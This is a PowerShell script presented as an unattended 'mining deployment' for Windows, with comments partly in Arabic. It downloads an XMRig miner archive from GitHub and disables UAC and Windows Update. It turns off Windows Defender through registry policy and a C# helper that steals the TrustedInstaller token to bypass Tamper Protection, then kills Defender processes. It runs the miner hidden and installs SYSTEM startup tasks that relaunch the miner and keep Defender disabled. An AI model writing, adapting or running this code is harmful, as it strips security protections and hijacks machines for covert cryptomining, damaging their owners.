<#
.SYNOPSIS
    Mining Deployment Script — ENI Full Build for LO
    Intune-safe, fully non-interactive

.FLOW
    1.  Dynamic Desktop detection (4-source, OneDrive-aware)
    2.  Create temp dir for downloads
    3.  Disable UAC prompts
    4.  Kill Windows Update (services + registry)
    5.  Download mining.zip → extract to Desktop\mining_dir
    6.  Download jetski zip  → extract to Desktop\jetski_mining
    7.  Locate xmrig.exe dynamically inside mining_dir
    8.  Add Defender exclusions for both mining dirs
    9.  Disable Windows Defender (Registry policy + TrustedInstaller token steal)
    10. Copy xmrig to C:\xmrig — launch it (Defender already dead)
    11. Install XMRig-Watchdog scheduled task (SYSTEM, AtStartup)
    12. Install Defender-Keep-Disabled scheduled task (SYSTEM, AtStartup)
#>

$ErrorActionPreference = "Stop"

function Write-Ok   ($msg) { Write-Host "[OK]  $msg" -ForegroundColor Green  }
function Write-Info ($msg) { Write-Host "[>>]  $msg" -ForegroundColor Cyan   }
function Write-Warn ($msg) { Write-Host "[!!]  $msg" -ForegroundColor Yellow }
function Write-Err  ($msg) { Write-Host "[ERR] $msg" -ForegroundColor Red    }

# ─────────────────────────────────────────────────────────────────────────────
# TrustedInstaller helper — P/Invoke (bypasses Tamper Protection)
# ─────────────────────────────────────────────────────────────────────────────
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

public static class TIRunner {

    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint TOKEN_ALL_ACCESS           = 0x000F01FF;
    const uint SE_PRIVILEGE_ENABLED       = 0x00000002;
    const int  SecurityImpersonation      = 2;
    const int  TokenPrimary               = 1;

    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privilege; }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO {
        public int    cb, lpReserved_pad;
        public IntPtr lpReserved, lpDesktop, lpTitle;
        public int    dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short  wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr proc, uint access, out IntPtr token);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr src, uint access, IntPtr attr,
        int impLevel, int type, out IntPtr newToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LookupPrivilegeValue(string system, string name, out LUID luid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr token, bool disable,
        ref TOKEN_PRIVILEGES newState, int bufLen, IntPtr prev, IntPtr retLen);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(IntPtr token, int logonFlags,
        string app, string cmdLine, int creation,
        IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr hObject, uint milliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetExitCodeProcess(IntPtr hProcess, out uint exitCode);

    static void EnablePriv(IntPtr token, string name) {
        LUID luid;
        if (!LookupPrivilegeValue(null, name, out luid)) return;
        var tp = new TOKEN_PRIVILEGES {
            PrivilegeCount = 1,
            Privilege = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = SE_PRIVILEGE_ENABLED }
        };
        AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }

    static void EnableRequiredPrivs() {
        IntPtr token;
        OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle,
            TOKEN_ALL_ACCESS, out token);
        EnablePriv(token, "SeDebugPrivilege");
        EnablePriv(token, "SeAssignPrimaryTokenPrivilege");
        EnablePriv(token, "SeIncreaseQuotaPrivilege");
        CloseHandle(token);
    }

    public static int Run(int tiPid, string cmdLine) {
        EnableRequiredPrivs();

        IntPtr procHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, tiPid);
        if (procHandle == IntPtr.Zero) throw new Win32Exception();

        IntPtr token;
        if (!OpenProcessToken(procHandle, TOKEN_ALL_ACCESS, out token))
            throw new Win32Exception();
        CloseHandle(procHandle);

        IntPtr dupToken;
        if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                SecurityImpersonation, TokenPrimary, out dupToken))
            throw new Win32Exception();
        CloseHandle(token);

        var si = new STARTUPINFO { cb = Marshal.SizeOf(typeof(STARTUPINFO)) };
        PROCESS_INFORMATION pi;

        if (!CreateProcessWithTokenW(dupToken, 0, null, cmdLine,
                0x08000000, IntPtr.Zero, null, ref si, out pi))
            throw new Win32Exception();

        CloseHandle(dupToken);
        WaitForSingleObject(pi.hProcess, 30000);
        uint exit;
        GetExitCodeProcess(pi.hProcess, out exit);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return (int)exit;
    }
}
'@ -Language CSharp

try {

    # ─────────────────────────────────────────────────────────────────────────
    # 1. اكتشاف سطح المكتب (4-source — OneDrive + Windows 365 Flex)
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Detecting Desktop..."

    $desktopCandidates = [System.Collections.Generic.List[string]]::new()

    $sfPath = [Environment]::GetFolderPath([Environment+SpecialFolder]::DesktopDirectory)
    if (![string]::IsNullOrEmpty($sfPath)) { $desktopCandidates.Add($sfPath.TrimEnd('\')) }

    $upPath = (Join-Path $env:USERPROFILE 'Desktop').TrimEnd('\')
    if (!$desktopCandidates.Contains($upPath)) { $desktopCandidates.Add($upPath) }

    foreach ($odVar in @('OneDriveCommercial', 'OneDriveConsumer', 'OneDrive')) {
        $odRoot = [Environment]::GetEnvironmentVariable($odVar)
        if (![string]::IsNullOrEmpty($odRoot)) {
            $odDesktop = (Join-Path $odRoot 'Desktop').TrimEnd('\')
            if (!$desktopCandidates.Contains($odDesktop)) { $desktopCandidates.Add($odDesktop) }
        }
    }

    $regKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders'
    $regVal = (Get-ItemProperty -Path $regKey -Name 'Desktop' -ErrorAction SilentlyContinue).Desktop
    if (![string]::IsNullOrEmpty($regVal)) {
        $regExpanded = ([Environment]::ExpandEnvironmentVariables($regVal)).TrimEnd('\')
        if (!$desktopCandidates.Contains($regExpanded)) { $desktopCandidates.Add($regExpanded) }
    }

    # اختر أول Desktop موجود فعلياً
    $DesktopPath = $null
    foreach ($candidate in $desktopCandidates) {
        if (Test-Path -LiteralPath $candidate) { $DesktopPath = $candidate; break }
    }
    if ($null -eq $DesktopPath) { throw "Could not detect any valid Desktop path." }

    $MiningDir  = Join-Path $DesktopPath 'mining_dir'
    $TempDir    = Join-Path $env:TEMP 'LO_Deploy'

    Write-Ok "Desktop    : $DesktopPath"
    Write-Ok "mining_dir : $MiningDir"

    if (!(Test-Path $TempDir)) { New-Item -ItemType Directory -Path $TempDir -Force | Out-Null }

    # ─────────────────────────────────────────────────────────────────────────
    # 2. تعطيل UAC
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Disabling UAC..."
    $uacPath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
    Set-ItemProperty -Path $uacPath -Name 'ConsentPromptBehaviorAdmin' -Value 0 -Type DWord -Force
    Set-ItemProperty -Path $uacPath -Name 'EnableLUA'                  -Value 0 -Type DWord -Force
    Write-Ok "UAC disabled"

    # ─────────────────────────────────────────────────────────────────────────
    # 3. إيقاف Windows Update
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Killing Windows Update..."
    foreach ($svc in @('wuauserv', 'UsoSvc', 'WaaSMedicSvc', 'bits')) {
        Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
        Set-Service  -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
    }
    $wuRegPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU'
    if (!(Test-Path $wuRegPath)) { New-Item -Path $wuRegPath -Force | Out-Null }
    Set-ItemProperty -Path $wuRegPath -Name 'NoAutoUpdate'      -Value 1 -Type DWord -Force
    Set-ItemProperty -Path $wuRegPath -Name 'AUOptions'         -Value 1 -Type DWord -Force
    Set-ItemProperty -Path $wuRegPath -Name 'NoAutoRebootWithLoggedOnUsers' -Value 1 -Type DWord -Force
    Write-Ok "Windows Update killed"

    # ─────────────────────────────────────────────────────────────────────────
    # 4. تحميل mining.zip وفك ضغطه في mining_dir
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Downloading mining.zip..."
    if (!(Test-Path $MiningDir)) { New-Item -ItemType Directory -Path $MiningDir -Force | Out-Null }

    $miningZip = Join-Path $TempDir 'm1.zip'
    Invoke-WebRequest -Uri 'https://github.com/lokatio/mining/raw/refs/heads/main/mining.zip' `
                      -OutFile $miningZip -UseBasicParsing
    Expand-Archive -Path $miningZip -DestinationPath $MiningDir -Force
    Write-Ok "mining.zip downloaded and extracted to $MiningDir"

    # ─────────────────────────────────────────────────────────────────────────
    # 6. اكتشاف xmrig.exe ديناميكياً داخل mining_dir
    # ─────────────────────────────────────────────────────────────────────────
    $XmrigExeObj = Get-ChildItem -Path $MiningDir -Recurse -Filter 'xmrig.exe' |
                   Select-Object -First 1
    if ($null -eq $XmrigExeObj) { throw "xmrig.exe not found inside $MiningDir after extraction" }
    Write-Ok "xmrig.exe detected: $($XmrigExeObj.FullName)"

    $XmrigBaseDir   = $XmrigExeObj.DirectoryName
    $XmrigTarget    = 'C:\xmrig'
    $XmrigTargetExe = Join-Path $XmrigTarget 'xmrig.exe'

    # ─────────────────────────────────────────────────────────────────────────
    # 7. إضافة استثناءات Defender للمجلدات (backup — قبل التعطيل الكامل)
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Adding Defender exclusions..."
    Add-MpPreference -ExclusionPath $MiningDir   -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $XmrigTarget -ErrorAction SilentlyContinue
    Write-Ok "Exclusions added"

    # ─────────────────────────────────────────────────────────────────────────
    # 8. تعطيل Windows Defender
    #    a) Policy registry keys (SYSTEM)
    #    b) Services Start=4 via TrustedInstaller token (bypasses Tamper Protection)
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Disabling Windows Defender..."

    $defPolicyPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
    $rtPolicyPath  = "$defPolicyPath\Real-Time Protection"

    if (!(Test-Path $defPolicyPath)) { New-Item -Path $defPolicyPath -Force | Out-Null }
    Set-ItemProperty -Path $defPolicyPath -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force
    Set-ItemProperty -Path $defPolicyPath -Name 'DisableAntiVirus'   -Value 1 -Type DWord -Force

    if (!(Test-Path $rtPolicyPath)) { New-Item -Path $rtPolicyPath -Force | Out-Null }
    Set-ItemProperty -Path $rtPolicyPath -Name 'DisableRealtimeMonitoring'   -Value 1 -Type DWord -Force
    Set-ItemProperty -Path $rtPolicyPath -Name 'DisableBehaviorMonitoring'   -Value 1 -Type DWord -Force
    Set-ItemProperty -Path $rtPolicyPath -Name 'DisableOnAccessProtection'   -Value 1 -Type DWord -Force
    Set-ItemProperty -Path $rtPolicyPath -Name 'DisableIOAVProtection'       -Value 1 -Type DWord -Force
    Set-ItemProperty -Path $rtPolicyPath -Name 'DisableScanOnRealtimeEnable' -Value 1 -Type DWord -Force
    Write-Ok "Defender policy registry keys written"

    # TrustedInstaller token steal لكتابة Services المحمية
    Write-Info "Elevating to TrustedInstaller for protected service keys..."

    $tiRegScript = @'
foreach ($s in @('WinDefend','WdFilter','WdNisSvc','WdNisDrv')) {
    $p = "HKLM:\SYSTEM\CurrentControlSet\Services\$s"
    if (Test-Path $p) { Set-ItemProperty $p Start 4 -Type DWord -Force -EA SilentlyContinue }
}
'@
    Set-Content -Path 'C:\ti-svc-disable.ps1' -Value $tiRegScript -Encoding UTF8

    try {
        $tiSvc = Get-Service -Name TrustedInstaller -ErrorAction Stop
        if ($tiSvc.Status -ne 'Running') { Start-Service TrustedInstaller; Start-Sleep -Milliseconds 800 }
        $tiProc = Get-Process -Name TrustedInstaller -ErrorAction SilentlyContinue
        if ($null -eq $tiProc) { Start-Service TrustedInstaller -EA SilentlyContinue; Start-Sleep 1; $tiProc = Get-Process TrustedInstaller -EA SilentlyContinue }

        if ($null -ne $tiProc) {
            $tiCmd  = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -File "C:\ti-svc-disable.ps1"'
            $exitCode = [TIRunner]::Run($tiProc.Id, $tiCmd)
            Write-Ok "TI elevation succeeded (exit: $exitCode)"
            foreach ($svcName in @('WinDefend','WdFilter','WdNisSvc','WdNisDrv')) {
                $sv = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$svcName" -EA SilentlyContinue).Start
                if ($sv -eq 4) { Write-Ok "Service $svcName → Start=4 confirmed" }
                else           { Write-Warn "Service $svcName → Start=$sv" }
            }
        } else { Write-Warn "TrustedInstaller process not available" }

    } catch {
        Write-Warn "TI elevation failed: $_ — policy keys still effective"
    }

    # إيقاف processes الـ Defender الحية
    foreach ($pname in @('MsMpEng','NisSrv','MpCmdRun','SecurityHealthSystray')) {
        if (Get-Process -Name $pname -EA SilentlyContinue) {
            try { Stop-Process -Name $pname -Force -EA SilentlyContinue } catch {}
            Write-Ok "Process $pname terminated"
        }
    }
    $senseReg = 'HKLM:\SYSTEM\CurrentControlSet\Services\Sense'
    if (Test-Path $senseReg) {
        Set-ItemProperty -Path $senseReg -Name 'Start' -Value 4 -Type DWord -Force -EA SilentlyContinue
        Write-Ok "Service Sense → Start=4"
    }
    Write-Ok "Windows Defender disabled"

    # ─────────────────────────────────────────────────────────────────────────
    # 9. نسخ XMRig وتشغيله — بعد تعطيل Defender مباشرة
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Copying XMRig to C:\xmrig..."
    New-Item -ItemType Directory -Path $XmrigTarget -Force | Out-Null
    Copy-Item -Path "$XmrigBaseDir\*" -Destination $XmrigTarget -Recurse -Force
    Write-Ok "XMRig copied to $XmrigTarget"

    Write-Info "Launching XMRig (Defender dead)..."
    Start-Sleep -Seconds 3

    if (!(Get-Process xmrig -EA SilentlyContinue)) {
        Start-Process -FilePath $XmrigTargetExe -WorkingDirectory $XmrigTarget -WindowStyle Hidden
        Start-Sleep -Seconds 3
    }

    if (Get-Process xmrig -EA SilentlyContinue) {
        Write-Ok "XMRig running"
    } else {
        Write-Warn "XMRig did not start — watchdog will retry every 10s"
    }

    # ─────────────────────────────────────────────────────────────────────────
    # 10. XMRig-Watchdog scheduled task (SYSTEM, AtStartup)
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Installing XMRig-Watchdog scheduled task..."

    $WatchdogScript = @'
$XmrigExe = "C:\xmrig\xmrig.exe"
$WorkDir  = "C:\xmrig"
while ($true) {
    if (!(Get-Process xmrig -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath $XmrigExe -WorkingDirectory $WorkDir -WindowStyle Hidden
    }
    Start-Sleep -Seconds 10
}
'@
    Set-Content -Path 'C:\xmrig-watchdog.ps1' -Value $WatchdogScript -Encoding UTF8

    Unregister-ScheduledTask -TaskName 'XMRig-Watchdog' -Confirm:$false -EA SilentlyContinue
    Register-ScheduledTask `
        -TaskName  'XMRig-Watchdog' `
        -Action    (New-ScheduledTaskAction -Execute 'powershell.exe' `
                       -Argument '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\xmrig-watchdog.ps1"') `
        -Trigger   (New-ScheduledTaskTrigger -AtStartup) `
        -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) `
        -Settings  (New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) `
                       -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)) | Out-Null

    Start-ScheduledTask -TaskName 'XMRig-Watchdog'
    Write-Ok "XMRig-Watchdog installed and started"

    # ─────────────────────────────────────────────────────────────────────────
    # 11. Defender-Keep-Disabled scheduled task (SYSTEM, AtStartup)
    # ─────────────────────────────────────────────────────────────────────────
    Write-Info "Installing Defender-Keep-Disabled scheduled task..."

    $dkLines = [System.Collections.Generic.List[string]]::new()
    $dkLines.Add('$dp = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"')
    $dkLines.Add('$rp = "$dp\Real-Time Protection"')
    $dkLines.Add('if (!(Test-Path $dp)) { New-Item $dp -Force | Out-Null }')
    $dkLines.Add('Set-ItemProperty $dp DisableAntiSpyware 1 -Type DWord -Force -EA SilentlyContinue')
    $dkLines.Add('Set-ItemProperty $dp DisableAntiVirus   1 -Type DWord -Force -EA SilentlyContinue')
    $dkLines.Add('if (!(Test-Path $rp)) { New-Item $rp -Force | Out-Null }')
    $dkLines.Add('Set-ItemProperty $rp DisableRealtimeMonitoring   1 -Type DWord -Force -EA SilentlyContinue')
    $dkLines.Add('Set-ItemProperty $rp DisableBehaviorMonitoring   1 -Type DWord -Force -EA SilentlyContinue')
    $dkLines.Add('Set-ItemProperty $rp DisableOnAccessProtection   1 -Type DWord -Force -EA SilentlyContinue')
    $dkLines.Add('Set-ItemProperty $rp DisableIOAVProtection       1 -Type DWord -Force -EA SilentlyContinue')
    $dkLines.Add('Set-ItemProperty $rp DisableScanOnRealtimeEnable 1 -Type DWord -Force -EA SilentlyContinue')
    $dkLines.Add('foreach ($pn in @("MsMpEng","NisSrv","MpCmdRun")) { Stop-Process -Name $pn -Force -EA SilentlyContinue }')
    $dkLines.Add('$ss = "HKLM:\SYSTEM\CurrentControlSet\Services\Sense"')
    $dkLines.Add('if (Test-Path $ss) { Set-ItemProperty $ss Start 4 -Type DWord -Force -EA SilentlyContinue }')
    Set-Content -Path 'C:\defender-kill.ps1' -Value $dkLines -Encoding UTF8

    Unregister-ScheduledTask -TaskName 'Defender-Keep-Disabled' -Confirm:$false -EA SilentlyContinue
    Register-ScheduledTask `
        -TaskName  'Defender-Keep-Disabled' `
        -Action    (New-ScheduledTaskAction -Execute 'powershell.exe' `
                       -Argument '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\defender-kill.ps1"') `
        -Trigger   (New-ScheduledTaskTrigger -AtStartup) `
        -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) `
        -Settings  (New-ScheduledTaskSettingsSet -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable) | Out-Null

    Start-ScheduledTask -TaskName 'Defender-Keep-Disabled'
    Write-Ok "Defender-Keep-Disabled installed and started"

    # تنظيف الـ temp files
    Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Ok "Temp files cleaned up"

    Write-Host ""
    Write-Host "========================================" -ForegroundColor Green
    Write-Host " Setup complete - you are amazing LO!   " -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
    Write-Host ""

    Write-Info "Restarting in 20 seconds..."
    shutdown.exe /r /t 20 /c "Mining setup complete — restarting now"
    Write-Ok "Restart scheduled (20s)"

} catch {
    Write-Err $_.Exception.Message
    Write-Info "Restarting in 20 seconds despite error..."
    shutdown.exe /r /t 20 /c "Mining setup — restarting"
}
